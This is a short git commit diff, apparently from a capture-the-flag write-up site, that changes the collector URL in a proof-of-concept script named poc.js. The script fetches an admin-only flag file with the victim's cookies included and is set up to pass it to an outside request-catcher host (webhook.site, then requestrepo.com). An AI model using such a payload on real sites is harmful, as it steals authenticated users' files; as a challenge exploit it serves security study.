3ae3e689575480103c01b42309339f6c59d59338
baozongwi <146065986+bzq05@users.noreply.github.com>
2025-04-13 21:25:00 +0800

    Site updated: 2025-04-13 21:24:59

--- poc.js
+++ poc.js
@@ -1,6 +1,6 @@
 (function(){
     const flagUrl = '/app/admin/flag.pdf';
-    const webhookUrl = 'https://webhook.site/35c13666-876f-4a80-bf03-1a1b6e97716f';
+    const webhookUrl = 'https://ydpaegf3.requestrepo.com/';
 
     fetch(flagUrl, { credentials: 'include' })
       .then(response => response.blob())
